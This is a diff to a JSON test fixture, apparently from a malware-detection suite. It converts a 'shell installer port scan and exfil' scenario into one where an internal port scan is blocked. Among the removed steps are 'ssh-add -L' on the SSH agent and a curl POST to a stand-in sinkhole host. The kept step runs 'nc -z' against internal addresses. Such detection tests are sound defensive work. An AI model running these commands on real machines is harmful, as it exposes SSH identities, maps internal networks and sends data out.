@@ -1,88 +1,68 @@
 {
   "pack_id": "shell-port-scan",
-  "title": "Shell installer port scan and exfil",
+  "title": "Internal recon and port scan blocked",
   "attack_family": "shell_installers",
   "public_tier": "private_advanced",
   "runtime_family": "shell",
   "artifact_type": "shell_installer",
   "artifact": {
     "ecosystem": "archive",
-    "source": "https://downloads.example.invalid/install-zitpit-port-scan.sh",
-    "requested_selector": "latest",
+    "source": "ssh://zitpit.invalid/internal-recon-port-scan",
+    "requested_selector": "sessiond",
     "selector_kind": "url"
   },
   "incident_refs": ["private/installer-port-scan-pattern"],
-  "technique_refs": ["ssh-agent-touch", "port-scan", "exfil"],
-  "control_pair_id": "control-benign-shell-installer",
+  "technique_refs": ["port-scan", "internal-recon"],
+  "control_pair_id": "control-benign-shell-command",
   "confidence_policy": "hard_ban",
   "allowed_baseline_signals": [],
   "persona_overrides": [],
   "required_personas": ["developer_workstation"],
   "required_scenarios": [
-    { "name": "curl_pipe_sh", "detonation": "install_build", "phase": "install" }
+    { "name": "internal_recon", "detonation": "cli_smoke", "phase": "cli" }
   ],
-  "suite_tags": ["fast", "artifact", "queue", "shell"],
+  "suite_tags": ["shell", "queue"],
   "execution": {
     "browser_required": false,
     "vm_required": false,
-    "queue_required": true,
-    "runner_mode": "queue_full"
+    "queue_required": false,
+    "runner_mode": "fixture_only"
   },
+  "expected_node_decision": "blocked_pre_exec",
   "expected_verdict": { "verdict": "malicious" },
   "expected_tripwires": {
-    "required": ["port_scan", "exfil_attempt", "ssh_agent_touch"],
+    "required": ["recon_denied"],
     "allowed_false_positives": []
   },
   "control_expectations": {
     "require_clean_verdict": true,
     "max_shared_tripwires": 0,
-    "notes": ["control should not reach internal targets or SSH agent"]
+    "notes": ["control should not trigger recon blocking"]
   },
   "evidence_minimums": {
     "require_captured_request": true,
-    "require_quarantine_job": true,
-    "require_lab_run": true,
+    "require_quarantine_job": false,
+    "require_lab_run": false,
     "require_evidence_bundle": true,
     "require_feed_visibility": true,
     "require_browser_trace": false
   },
   "timing": {
-    "max_queue_latency_ms": 2000,
-    "max_detonation_startup_ms": 2000,
-    "max_verdict_completion_ms": 2000
+    "max_queue_latency_ms": 500,
+    "max_detonation_startup_ms": 500,
+    "max_verdict_completion_ms": 500
   },
   "files": ["install.sh"],
   "steps": [
     {
-      "step_id": "touch_ssh_agent",
-      "detail": "installer inspects the SSH agent socket for loaded identities",
-      "phase": "install",
-      "process_lineage": ["curl | sh"],
-      "command": "ssh-add -L",
-      "file_path": "$SSH_AUTH_SOCK",
-      "tripwire": "ssh_agent_touch",
-      "severity": "high"
-    },
-    {
-      "step_id": "scan_ports",
-      "detail": "installer scans internal RFC1918 targets for open ports",
-      "phase": "install",
-      "process_lineage": ["curl | sh"],
+      "step_id": "deny_internal_recon",
+      "detail": "session broker rejects internal recon and direct port scans in the protected SSH container",
+      "phase": "cli",
+      "process_lineage": ["zitpit-sessiond", "nc"],
       "command": "nc -z 10.0.0.1 22 80 443",
       "network_target": "10.0.0.1/24",
       "network_protocol": "tcp",
-      "tripwire": "port_scan",
-      "severity": "critical"
-    },
-    {
-      "step_id": "exfil_results",
-      "detail": "installer posts the scan result to an exfil sinkhole",
-      "phase": "install",
-      "process_lineage": ["curl | sh"],
-      "command": "curl -X POST https://sinkhole.zitpit.invalid/upload",
-      "network_target": "sinkhole.zitpit.invalid",
-      "network_protocol": "https",
-      "tripwire": "exfil_attempt",
+      "tripwire": "recon_denied",
       "severity": "critical"
     }
   ]
